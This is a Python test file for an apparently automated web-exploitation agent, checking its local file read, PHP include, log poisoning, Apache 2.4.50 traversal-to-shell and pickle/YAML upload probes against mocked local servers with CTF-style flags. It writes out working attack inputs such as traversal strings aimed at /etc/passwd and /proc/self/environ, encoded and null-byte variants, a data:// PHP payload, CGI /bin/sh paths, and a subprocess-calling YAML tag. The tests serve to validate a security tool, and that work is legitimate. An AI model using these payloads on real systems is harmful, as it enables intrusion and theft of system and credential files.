from __future__ import annotations

import json
import pickle
import re
from typing import cast
from urllib.parse import parse_qs, urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.probe_suite import ProbeRunResult
from ravage.probes.file_read import (
    _file_read_probe_payloads,
    _file_read_signal,
    _file_target_priority,
    probe_file_fetch_parser,
    probe_file_read_extract,
)
from ravage.web_core.http_probe import ProbeResponse, ProbeSession


def _probe_session(session: object) -> ProbeSession:
    return cast("ProbeSession", session)


def _dict_field(mapping: dict[str, object], key: str) -> dict[str, object]:
    value = mapping[key]
    assert isinstance(value, dict)
    return cast("dict[str, object]", value)


def _string_field(mapping: dict[str, object], key: str) -> str:
    value = mapping[key]
    assert isinstance(value, str)
    return value


def _proofs(finding: dict[str, object]) -> list[str]:
    value = finding.get("proofs", [])
    assert isinstance(value, list)
    return [str(item) for item in value]


def _file_backed_id_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [
            {
                "name": "id",
                "locations": ["http://127.0.0.1/post.php?id=Article.php"],
                "hints": ["object_id"],
                "priority": 20,
            }
        ],
        "forms": [],
        "endpoints": [{"url": "http://127.0.0.1/post.php?id=Article.php"}],
    }
    return state


def _php_endpoint_without_query_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [],
        "endpoints": [
            {"url": "http://127.0.0.1/about.php", "hints": ["page"]},
            {"url": "http://127.0.0.1/style.css", "hints": ["static"]},
        ],
        "pages": [
            {"final_url": "http://127.0.0.1/about.php", "url": "http://127.0.0.1/about.php"},
            {"final_url": "http://127.0.0.1/style.css", "url": "http://127.0.0.1/style.css"},
        ],
    }
    return state


def _extensionless_reflection_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/page",
        "origin": "http://127.0.0.1",
        "parameters": [
            {
                "name": "name",
                "locations": ["http://127.0.0.1/page?name=ravage"],
                "hints": ["reflected"],
                "priority": 20,
            }
        ],
        "forms": [],
        "endpoints": [{"url": "http://127.0.0.1/page", "hints": ["page"]}],
        "pages": [{"final_url": "http://127.0.0.1/page", "url": "http://127.0.0.1/page"}],
    }
    return state


def _pickle_upload_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [
            {
                "action": "http://127.0.0.1/",
                "method": "POST",
                "enctype": "multipart/form-data",
                "inputs": [{"name": "data_file", "type": "file"}],
            }
        ],
        "endpoints": [{"url": "http://127.0.0.1/"}],
    }
    return state


def _explicit_pickle_upload_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "visible_description": "Uploading a pickle file without sanitization allows RCE",
        "parameters": [],
        "forms": [
            {
                "action": "http://127.0.0.1/",
                "method": "POST",
                "enctype": "multipart/form-data",
                "inputs": [{"name": "pickle_file", "type": "file"}],
                "file_fields": ["pickle_file"],
            }
        ],
        "endpoints": [{"url": "http://127.0.0.1/"}],
    }
    return state


def _authenticated_upload_signal_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [],
        "endpoints": [{"url": "http://127.0.0.1/profile"}],
    }
    form = {
        "action": "http://127.0.0.1/profile",
        "method": "POST",
        "enctype": "multipart/form-data",
        "inputs": [{"name": "loan_file", "type": "file"}],
        "categories": ["authenticated", "upload", "file"],
        "auth_headers": {"Cookie": "session=valid"},
    }
    state.signals["forms"] = [json.dumps(form, sort_keys=True)]
    return state


def _private_listing_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [],
        "endpoints": [{"url": "http://127.0.0.1/private.php", "hints": ["private"]}],
    }
    return state


def _apache_2450_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "server": "Apache/2.4.50 (Unix)",
        "pages": [
            {
                "url": "http://127.0.0.1/",
                "headers": {"server": "Apache/2.4.50 (Unix)"},
            }
        ],
    }
    return state


def _static_resource_filename_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/login",
        "origin": "http://127.0.0.1",
        "parameters": [
            {
                "name": "filename",
                "locations": [
                    "http://127.0.0.1/login",
                    "http://127.0.0.1/resource?filename=css/bootstrap.min.css",
                ],
                "hints": ["file"],
                "priority": 26,
            }
        ],
        "forms": [],
        "endpoints": [
            {"url": "http://127.0.0.1/login"},
            {"url": "http://127.0.0.1/resource?filename=css/bootstrap.min.css"},
        ],
        "pages": [
            {
                "url": "http://127.0.0.1/login",
                "final_url": "http://127.0.0.1/login",
            }
        ],
    }
    return state


def test_file_fetch_parser_tests_file_backed_id_parameters() -> None:
    session = _FakeFileReadSession()

    result = probe_file_fetch_parser(_probe_session(session), _file_backed_id_state(), ProbeRunResult)

    assert result.ok is True
    finding = result.findings[0]
    assert finding["type"] == "file_read_primitive"
    assert _dict_field(finding, "input")["input"] == "id"
    assert "proc/self/root/etc/passwd" in str(finding["payload"])


def test_file_fetch_parser_closes_php_lfi_after_local_file_read() -> None:
    session = _FakeFileReadSession()

    result = probe_file_fetch_parser(_probe_session(session), _file_backed_id_state(), ProbeRunResult)

    assert any(finding["type"] == "php_include_extracted_proof" for finding in result.findings)
    assert any("flag{generic_file_read_extract}" in _proofs(finding) for finding in result.findings)
    assert any(request.get("probe_kind") == "php_log_poison_include" for request in result.requests)


def test_file_fetch_parser_adds_generic_file_params_to_dynamic_pages() -> None:
    session = _FakeFileReadSession()

    result = probe_file_fetch_parser(
        _probe_session(session),
        _php_endpoint_without_query_state(),
        ProbeRunResult,
    )

    assert result.ok is True
    finding = result.findings[0]
    assert finding["type"] == "file_read_primitive"
    finding_input = _dict_field(finding, "input")
    assert finding_input["url"] == "http://127.0.0.1/about.php"
    assert finding_input["input"] == "file"
    assert "style.css" not in str(result.requests)


def test_file_fetch_parser_keeps_extensionless_fallback_small() -> None:
    session = _FakeFileReadSession()

    result = probe_file_fetch_parser(
        _probe_session(session),
        _extensionless_reflection_state(),
        ProbeRunResult,
    )

    targeted = [
        cast("dict[str, object]", request["target"])
        for request in result.requests
        if isinstance(request.get("target"), dict)
    ]
    verify_requests = [request for request in result.requests if request.get("probe_kind") == "file_read_verify"]
    assert result.ok is False
    assert {target["input"] for target in targeted} == {"name"}
    assert all("file=" not in str(request.get("final_url")) for request in result.requests)
    assert len(verify_requests) == 2


def test_file_read_extract_uses_confirmed_primitive_for_php_include_execution() -> None:
    state = _file_backed_id_state()
    primitive = {
        "target": {
            "kind": "query_param",
            "url": "http://127.0.0.1/post.php?id=Article.php",
            "input": "id",
            "hints": ["object_id"],
        },
        "payload": "../../../../../proc/self/root/etc/passwd",
        "signal": {"kind": "local_file_read"},
    }
    state.signals["file_read_inputs"] = [json.dumps(primitive, sort_keys=True)]
    state.signals["markers"] = ["php", "file_read_confirmed"]
    session = _FakeFileReadSession()

    result = probe_file_read_extract(_probe_session(session), state, ProbeRunResult)

    assert result.ok is True
    assert any(finding["type"] == "php_include_extracted_proof" for finding in result.findings)
    assert any("flag{generic_file_read_extract}" in _proofs(finding) for finding in result.findings)


def test_file_read_extract_does_not_promote_php_include_warning_pages() -> None:
    state = AgentState()
    state.surface = {"target_url": "http://127.0.0.1/", "origin": "http://127.0.0.1"}
    state.signals["markers"] = ["php", "file_read_confirmed"]
    primitive = {
        "target": {
            "kind": "query_param",
            "url": "/wp-content/plugins/demo/detail.php",
            "input": "wp_abspath",
            "name": "wp_abspath",
            "method": "GET",
            "fields": {"subdomain": "localhost", "app_api": "localhost", "scheme": "asset", "id": "1"},
            "hints": ["php_include", "request_controlled_include"],
        },
        "payload": "data://text/plain,<?php echo 'RAVAGE'; exit; ?>",
        "signal": {
            "kind": "php_include_entrypoint",
            "entrypoint": {
                "kind": "request_controlled_php_include",
                "endpoint": "/wp-content/plugins/demo/detail.php",
                "method": "GET",
                "param": "wp_abspath",
                "suffix": "/wp-admin/admin.php",
            },
        },
    }
    state.signals["file_read_inputs"] = [json.dumps(primitive, sort_keys=True)]
    session = _PhpSuffixIncludeFailureSession()

    result = probe_file_read_extract(_probe_session(session), state, ProbeRunResult)

    assert result.ok is False
    assert result.findings == []
    assert any(request.get("include_failure") == "php_url_wrapper_disabled" for request in result.requests)
    assert not any(str(payload).startswith("file:///app/") for payload in session.payloads)


def test_file_read_extract_prioritizes_apache_2450_direct_get_before_bad_cgi_shell() -> None:
    session = _Apache2450DirectTraversalSession()

    result = probe_file_read_extract(_probe_session(session), _apache_2450_state(), ProbeRunResult)

    assert result.ok is True
    assert any("flag{apache_2450_direct_get}" in _proofs(finding) for finding in result.findings)
    assert session.cgi_posts == 0
    direct_requests = [
        request
        for request in result.requests
        if isinstance(request.get("target"), dict)
        and cast("dict[str, object]", request["target"]).get("kind") == "direct_path"
        and request.get("probe_kind") == "extract_verify"
    ]
    assert direct_requests
    direct_target = _dict_field(direct_requests[0], "target")
    assert _string_field(direct_target, "url").startswith("http://127.0.0.1/cgi-bin/.%25%32%65/")


def test_file_read_extract_reaches_late_raw_percent_cgi_and_closes_proof() -> None:
    session = _Apache2450LateRawCgiSession()

    result = probe_file_read_extract(_probe_session(session), _apache_2450_state(), ProbeRunResult)

    assert result.ok is True
    assert any("flag{apache_late_raw_cgi}" in _proofs(finding) for finding in result.findings)
    assert any("/.%%32%65/" in request[1] for request in session.requests)
    assert len(session.requests) <= 16
    assert all(
        "/etc/passwd" in body
        for method, _url, body in session.requests[: session.primitive_request_index + 1]
        if method == "POST"
    )


def test_file_fetch_parser_keeps_verified_apache_vulnerability_without_flag() -> None:
    session = _Apache2450LateRawDirectNoProofSession()

    result = probe_file_fetch_parser(_probe_session(session), _apache_2450_state(), ProbeRunResult)

    assert result.ok is True
    primitive = next(finding for finding in result.findings if finding["type"] == "file_read_primitive")
    assert _dict_field(primitive, "signal")["kind"] == "local_file_read"
    assert not any(_proofs(finding) for finding in result.findings)
    assert len(session.requests) <= 24


def test_file_fetch_parser_detects_pickle_upload_parser_response() -> None:
    session = _PickleUploadSession()

    result = probe_file_fetch_parser(_probe_session(session), _pickle_upload_state(), ProbeRunResult)

    assert result.ok is True
    assert any(finding["type"] == "file_upload_extracted_proof" for finding in result.findings)
    assert any("flag{generic_pickle_upload}" in _proofs(finding) for finding in result.findings)
    assert any(str(request.get("filename", "")).endswith(".pkl") for request in result.requests)


def test_file_fetch_parser_reads_sensitive_filename_discovered_from_listing() -> None:
    session = _PrivateListingFileReadSession()

    result = probe_file_fetch_parser(_probe_session(session), _private_listing_state(), ProbeRunResult)

    assert result.ok is True
    finding = next(finding for finding in result.findings if finding["type"] == "file_read_listed_file_proof")
    assert "flag{generic_listed_private_file}" in _proofs(finding)
    assert "backup-secret.txt" in _string_field(finding, "fetch_url")
    assert any(request.get("probe_kind") == "file_read_list_action" for request in result.requests)


def test_file_fetch_parser_prioritizes_extensionless_static_resource_filename() -> None:
    session = _StaticResourceFilenameSession()

    result = probe_file_fetch_parser(
        _probe_session(session),
        _static_resource_filename_state(),
        ProbeRunResult,
    )

    assert result.ok is True
    assert any("flag{static_resource_filename}" in _proofs(finding) for finding in result.findings)
    first_verify = next(request for request in result.requests if request.get("probe_kind") == "file_read_verify")
    first_target = _dict_field(first_verify, "target")
    assert first_target["url"] == "http://127.0.0.1/resource?filename=css/bootstrap.min.css"
    assert first_verify["payload"] == "flag"


def test_file_fetch_parser_does_not_use_state_mutating_pickle_unlock() -> None:
    session = _PickleIgnoredStateUnlockSession()

    result = probe_file_fetch_parser(_probe_session(session), _pickle_upload_state(), ProbeRunResult)

    assert session.decoy is True
    assert not any(finding["type"] == "file_upload_deserialization_side_effect_proof" for finding in result.findings)
    assert not any("flag{generic_pickle_state_unlock}" in _proofs(finding) for finding in result.findings)
    assert not any(str(request.get("filename", "")).endswith("_state_unlock.pkl") for request in result.requests)


def test_file_fetch_parser_uses_decoy_unlock_for_explicit_pickle_upload() -> None:
    session = _PickleDecoyUnlockSession()

    result = probe_file_fetch_parser(
        _probe_session(session),
        _explicit_pickle_upload_state(),
        ProbeRunResult,
    )

    assert session.decoy is False
    assert any(
        finding["type"] == "file_upload_deserialization_side_effect_proof" for finding in result.findings
    )
    assert any("flag{generic_pickle_state_unlock}" in _proofs(finding) for finding in result.findings)
    assert any(str(request.get("filename", "")).endswith("_decoy_unlock.pkl") for request in result.requests)


def test_file_fetch_parser_detects_yaml_upload_parser_response() -> None:
    session = _YamlUploadSession()

    result = probe_file_fetch_parser(_probe_session(session), _pickle_upload_state(), ProbeRunResult)

    assert result.ok is True
    assert any(finding["type"] == "file_upload_extracted_proof" for finding in result.findings)
    assert any("flag{generic_yaml_upload}" in _proofs(finding) for finding in result.findings)
    assert any(str(request.get("filename", "")).endswith(".yaml") for request in result.requests)


def test_file_fetch_parser_replays_authenticated_signal_upload_form() -> None:
    session = _AuthenticatedUploadSession()

    result = probe_file_fetch_parser(
        _probe_session(session),
        _authenticated_upload_signal_state(),
        ProbeRunResult,
    )

    assert result.ok is True
    assert session.seen_cookie is True
    assert any(finding["type"] == "file_upload_extracted_proof" for finding in result.findings)
    assert any("flag{generic_authenticated_upload}" in _proofs(finding) for finding in result.findings)


def test_file_fetch_parser_includes_action_relative_php_upload() -> None:
    session = _PhpUploadIncludeSession()

    result = probe_file_fetch_parser(_probe_session(session), _php_upload_include_state(), ProbeRunResult)

    assert result.ok is True
    assert any(finding["type"] == "file_upload_extracted_proof" for finding in result.findings)
    assert any("flag{generic_php_upload_include}" in _proofs(finding) for finding in result.findings)
    assert any(
        request.get("probe_kind") == "file_upload_readback"
        and "/post.php?id=uploads/ravage_" in str(request.get("url", ""))
        for request in result.requests
    )


def test_upload_readback_marker_is_sink_evidence_not_proof() -> None:
    session = _StaticServedUploadSession()

    result = probe_file_fetch_parser(_probe_session(session), _static_served_upload_state(), ProbeRunResult)

    sink = [f for f in result.findings if f["type"] == "file_upload_sink_reachable"]
    assert sink, "expected a sink-reachable finding from the served upload marker"
    assert sink[0]["is_proof"] is False
    assert _proofs(sink[0]) == []
    assert "pivot" in _string_field(sink[0], "next").lower()
    assert all(not _proofs(finding) for finding in result.findings)
    assert any("/static/images/" in str(request.get("url", "")) for request in result.requests)


def test_upload_response_marker_is_sink_evidence_not_proof() -> None:
    session = _ReflectedUploadMarkerSession()

    result = probe_file_fetch_parser(_probe_session(session), _static_served_upload_state(), ProbeRunResult)

    sink = [f for f in result.findings if f["type"] == "file_upload_sink_reachable"]
    assert sink, "expected reflected upload marker to be reported as reachability evidence"
    assert sink[0]["is_proof"] is False
    assert _proofs(sink[0]) == []
    assert str(sink[0].get("marker", "")).startswith("RAVAGE_UPLOAD_")


def test_lfi_probe_payloads_include_awe_style_variants() -> None:
    payloads = _file_read_probe_payloads(_probe_session(_FakeFileReadSession()))

    assert "/etc/hosts" in payloads
    assert "/proc/self/environ" in payloads
    assert "../../../../flag.txt" in payloads
    assert "..%2F..%2F..%2Fetc%2Fpasswd" in payloads
    assert "..%252F..%252F..%252Fetc%252Fpasswd" in payloads
    assert "../../../../etc/passwd%00" in payloads


def test_observed_file_read_parameter_outranks_synthetic_file_guess() -> None:
    observed_page = {
        "kind": "query_param",
        "name": "page",
        "input": "page",
        "url": "http://127.0.0.1/?page=1",
        "sources": ["query"],
        "hints": [],
        "priority": 0,
    }
    synthetic_file = {
        "kind": "query_param",
        "name": "file",
        "input": "file",
        "url": "http://127.0.0.1/contact.php",
        "sources": ["synthetic_file_param"],
        "hints": ["file_param_candidate"],
        "priority": 28,
        "synthetic": True,
    }

    assert _file_target_priority(observed_page) > _file_target_priority(synthetic_file)


def test_lfi_signal_detects_hosts_and_proc_environ() -> None:
    baseline = ProbeResponse(method="GET", url="u", status=200, final_url="u", elapsed_ms=1, body="not found")
    hosts = ProbeResponse(method="GET", url="u", status=200, final_url="u", elapsed_ms=1, body="127.0.0.1 localhost\n")
    environ = ProbeResponse(
        method="GET",
        url="u",
        status=200,
        final_url="u",
        elapsed_ms=1,
        body="PATH=/usr/local/bin\x00HOME=/root\x00USER=www-data\x00",
    )

    assert _file_read_signal(hosts, baseline=baseline) == {
        "kind": "local_file_read",
        "indicator": "hosts",
        "matches": ["127.0.0.1 localhost"],
    }
    assert _file_read_signal(environ, baseline=baseline) == {
        "kind": "local_file_read",
        "indicator": "environ",
        "matches": ["PATH", "HOME", "USER"],
    }


def _static_served_upload_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/update_profile",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [
            {
                "action": "http://127.0.0.1/update_profile",
                "method": "POST",
                "enctype": "multipart/form-data",
                "inputs": [{"name": "image_profile", "type": "file"}],
            }
        ],
        "endpoints": [{"url": "http://127.0.0.1/update_profile"}],
    }
    return state


def _php_upload_include_state() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [
            {
                "action": "http://127.0.0.1/posts/upload-article.php",
                "method": "POST",
                "enctype": "multipart/form-data",
                "inputs": [
                    {"name": "name", "type": "text"},
                    {"name": "email", "type": "email"},
                    {"name": "articleFile", "type": "file"},
                ],
                "file_fields": ["articleFile"],
                "categories": ["upload", "file"],
            }
        ],
        "endpoints": [
            {"url": "http://127.0.0.1/post.php?id=Article", "hints": ["include"]},
            {"url": "http://127.0.0.1/posts/upload-article.php", "hints": ["upload"]},
        ],
    }
    return state


class _FakeFileReadSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.poison_token = ""

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        absolute = self.absolute(url)
        if headers and "<?php" in headers.get("User-Agent", ""):
            match = re.search(r"RAVAGE_PHP_INCLUDE_[0-9a-f]+", headers["User-Agent"])
            self.poison_token = match.group(0) if match else ""
            return self._response(absolute, "seeded")
        query = parse_qs(urlsplit(absolute).query)
        payload = query.get("id", [""])[0]
        synthetic_file = query.get("file", [""])[0]
        if "proc/self/root/etc/passwd" in payload:
            return self._response(absolute, "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin")
        if urlsplit(absolute).path == "/about.php" and "proc/self/root/etc/passwd" in synthetic_file:
            return self._response(absolute, "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin")
        if "var/log/apache2/access.log" in payload and self.poison_token:
            return self._response(absolute, self.poison_token + " flag{generic_file_read_extract}")
        return self._response(absolute, "<p>Post not found.</p>")

    def _response(self, url: str, body: str) -> ProbeResponse:
        return ProbeResponse(
            method="GET",
            url=url,
            status=200,
            final_url=url,
            elapsed_ms=1,
            headers={"content-type": "text/html", "x-powered-by": "PHP/7.4"},
            body=body,
        )


class _Apache2450DirectTraversalSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.cgi_posts = 0

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        return self.request("GET", url)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del data, headers
        absolute = self.absolute(url)
        status = 404
        body = "not found"
        path = urlsplit(absolute).path
        if method == "POST" and "/cgi-bin/" in path and path.endswith("/bin/sh"):
            self.cgi_posts += 1
            status = 400
            body = "bad request"
        elif method == "GET" and path.endswith("/etc/passwd") and (
            "/.%25%32%65/" in path or "/.%252e/" in path or "/.%%32%65/" in path
        ):
            status = 200
            body = (
                "root:x:0:0:root:/root:/bin/bash\n"
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
            )
        elif method == "GET" and path.endswith("/FLAG.txt") and (
            "/.%25%32%65/" in path or "/.%252e/" in path or "/.%%32%65/" in path
        ):
            status = 200
            body = "flag{apache_2450_direct_get}"
        elif method == "GET" and path == "/":
            status = 200
            body = "<html>Apache 2.4.50</html>"
        return ProbeResponse(
            method=method,
            url=absolute,
            status=status,
            final_url=absolute,
            elapsed_ms=1,
            headers={"content-type": "text/html", "server": "Apache/2.4.50 (Unix)"},
            body=body,
        )


class _Apache2450LateRawCgiSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.requests: list[tuple[str, str, str]] = []
        self.primitive_request_index = -1

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        return self.request("GET", url)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        command = data.decode("utf-8", "ignore") if data else ""
        self.requests.append((method, absolute, command))
        status = 404
        body = "not found"
        path = urlsplit(absolute).path
        if method == "GET" and path == "/":
            status = 200
            body = "<html>Apache 2.4.50</html>"
        elif (
            method == "POST"
            and "/.%%32%65/" in path
            and path.endswith("/bin/sh")
            and "head -c 8192 -- '/etc/passwd'" in command
        ):
            self.primitive_request_index = len(self.requests) - 1
            status = 200
            body = (
                "root:x:0:0:root:/root:/bin/bash\n"
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
            )
        elif (
            method == "POST"
            and "/.%%32%65/" in path
            and path.endswith("/bin/sh")
            and "head -c 8192 -- '/FLAG.txt'" in command
        ):
            status = 200
            body = "flag{apache_late_raw_cgi}"
        return ProbeResponse(
            method=method,
            url=absolute,
            status=status,
            final_url=absolute,
            elapsed_ms=1,
            headers={"content-type": "text/html", "server": "Apache/2.4.50 (Unix)"},
            body=body,
        )


class _Apache2450LateRawDirectNoProofSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.requests: list[tuple[str, str]] = []

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        return self.request("GET", url)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del data, headers
        absolute = self.absolute(url)
        self.requests.append((method, absolute))
        path = urlsplit(absolute).path
        status = 404
        body = "not found"
        if method == "GET" and path == "/":
            status = 200
            body = "<html>Apache 2.4.50</html>"
        elif method == "GET" and "/.%%32%65/" in path and path.endswith("/etc/passwd"):
            status = 200
            body = (
                "root:x:0:0:root:/root:/bin/bash\n"
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
            )
        return ProbeResponse(
            method=method,
            url=absolute,
            status=status,
            final_url=absolute,
            elapsed_ms=1,
            headers={"content-type": "text/html", "server": "Apache/2.4.50 (Unix)"},
            body=body,
        )


class _PhpSuffixIncludeFailureSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def __init__(self) -> None:
        self.payloads: list[str] = []

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        query = parse_qs(urlsplit(absolute).query)
        payload = query.get("wp_abspath", [""])[0]
        self.payloads.append(payload)
        if payload.startswith("data://"):
            body = (
                "<br /><b>Warning</b>: require_once(): data:// wrapper is disabled in the server "
                "configuration by allow_url_include=0<br />"
                "<br /><b>Fatal error</b>: require_once(): Failed opening required "
                f"'{payload}/wp-admin/admin.php' (include_path='.:/usr/share/php')<br />"
            )
        else:
            body = (
                "<br /><b>Warning</b>: require_once("
                f"{payload}/wp-admin/admin.php): failed to open stream: No such file or directory<br />"
                "<br /><b>Fatal error</b>: require_once(): Failed opening required "
                f"'{payload}/wp-admin/admin.php' (include_path='.:/usr/share/php')<br />"
            )
        return ProbeResponse(
            method="GET",
            url=absolute,
            status=200,
            final_url=absolute,
            elapsed_ms=1,
            headers={"content-type": "text/html", "x-powered-by": "PHP/7.4"},
            body=body,
        )


class _PickleUploadSession:
    target_url = "http://127.0.0.1/"
    origin = "http://127.0.0.1"
    timeout_seconds = 5

    def absolute(self, value: str) -> str:
        if value.startswith("http://"):
            return value
        return self.origin + "/" + value.lstrip("/")

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        return self._response(self.absolute(url), "not found", method="GET", status=404)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        file_body = _multipart_file_body(data or b"")
        try:
            loaded = pickle.loads(file_body)
        except Exception:
            loaded = None
        if isinstance(loaded, dict) and loaded.get("ravage_pickle_probe"):
            return self._response(
                self.absolute(url),
                f"processed {loaded['ravage_pickle_probe']} flag{{generic_pickle_upload}}",
                method=method,
            )
        return self._response(self.absolute(url), "Internal Server Error", method=method, status=500)

    def _response(self, url: str, body: str, *, method: str = "POST", status: int = 200) -> ProbeResponse:
        return ProbeResponse(
            method=method,
            url=url,
            status=status,
            final_url=url,
            elapsed_ms=1,
            headers={"content-type": "text/html", "server": "uvicorn"},
            body=body,
        )


class _PrivateListingFileReadSession(_PickleUploadSession):
    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        parts = urlsplit(absolute)
        query = parse_qs(parts.query)
        if parts.path == "/private.php" and query.get("file", [""])[0] == "backup-secret.txt":
            return self._response(absolute, "<pre>flag{generic_listed_private_file}</pre>", method="GET")
        if parts.path == "/private.php" and (not parts.query or query.get("action") or query.get("list")):
            body = "<table><tr><td>index.php</td></tr><tr><td>backup-secret.txt</td></tr></table>"
            return self._response(absolute, body, method="GET")
        return self._response(absolute, "not found", method="GET", status=404)


class _StaticResourceFilenameSession(_PickleUploadSession):
    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        parts = urlsplit(absolute)
        query = parse_qs(parts.query)
        filename = query.get("filename", [""])[0]
        if parts.path == "/resource" and filename == "css/bootstrap.min.css":
            return self._response(absolute, "@charset 'UTF-8'; .btn{display:inline-block}", method="GET")
        if parts.path == "/resource" and filename == "flag":
            return self._response(absolute, "flag{static_resource_filename}", method="GET")
        if parts.path == "/login":
            return self._response(absolute, "<html><link href='/resource?filename=css/bootstrap.min.css'></html>", method="GET")
        return self._response(absolute, "not found", method="GET", status=404)


class _YamlUploadSession(_PickleUploadSession):
    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        file_body = _multipart_file_body(data or b"")
        if b"!!python/object/apply:subprocess.check_output" in file_body:
            return self._response(self.absolute(url), "processed flag{generic_yaml_upload}", method=method)
        if b"ravage_yaml_probe:" in file_body:
            return self._response(self.absolute(url), file_body.decode("utf-8", errors="ignore"), method=method)
        return self._response(self.absolute(url), "Internal Server Error", method=method, status=500)


class _PickleIgnoredStateUnlockSession(_PickleUploadSession):
    def __init__(self) -> None:
        self.decoy = True

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        absolute = self.absolute(url)
        if urlsplit(absolute).path == "/":
            body = "Current status: this is just the decoy" if self.decoy else "flag{generic_pickle_state_unlock}"
            return self._response(absolute, body, method="GET")
        return self._response(absolute, "not found", method="GET", status=404)

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        filename = _multipart_filename(data or b"")
        if filename.endswith("_state_unlock.pkl"):
            self.decoy = False
        return self._response(self.absolute(url), "Upload processed.", method=method)


class _PickleDecoyUnlockSession(_PickleIgnoredStateUnlockSession):
    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        del headers
        filename = _multipart_filename(data or b"")
        if filename.endswith("_decoy_unlock.pkl"):
            self.decoy = False
        return self._response(self.absolute(url), "Upload processed.", method=method)


class _AuthenticatedUploadSession(_PickleUploadSession):
    def __init__(self) -> None:
        self.seen_cookie = False

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> ProbeResponse:
        if (headers or {}).get("Cookie") != "session=valid":
            return self._response(self.absolute(url), "Forbidden", method=method, status=403)
        self.seen_cookie = True
        file_body = _multipart_file_body(data or b"")
        try:
            loaded = pickle.loads(file_body)
        except Exception:
            loaded = None
        if isinstance(loaded, dict) and loaded.get("ravage_pickle_probe"):
            return self._response(
                self.absolute(url),
                f"processed {loaded['ravage_pickle_probe']} flag{{generic_authenticated_upload}}",
                method=method,
            )
        return self._response(self.absolute(url), "Internal Server Error", method=method, status=500)


class _PhpUploadIncludeSession(_PickleUploadSession):
    def __init__(self) -> None:
        self.stored: dict[str, bytes] = {}

    def request(
        self,
        method: str,
        url: str,
        *,
        data: bytes | None = None,
